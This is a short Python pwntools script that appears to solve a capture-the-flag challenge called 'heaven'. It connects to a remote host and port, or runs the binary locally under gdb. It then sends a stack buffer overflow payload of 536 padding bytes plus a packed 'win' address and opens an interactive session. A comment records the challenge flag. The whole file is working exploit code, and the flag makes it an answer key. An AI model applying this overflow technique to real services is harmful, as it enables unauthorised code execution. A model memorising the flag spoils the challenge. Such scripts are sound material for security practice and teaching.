#!/usr/bin/env python3
from pwn import remote, args, p64, gdb, shellcraft, asm

if args.REMOTE:
    p = remote("52.59.124.14", 10050)
else:
    p = gdb.debug("./heaven", gdbscript="""
    b *main+318
    continue
    """)

p.recvuntil(b">>")
PAYLOAD = b'a'*536 + p64(0x401236) # win address
p.sendline(PAYLOAD)
p.interactive() # ENO{h34v3nly_4ddr355_f0r_th3_w1n}
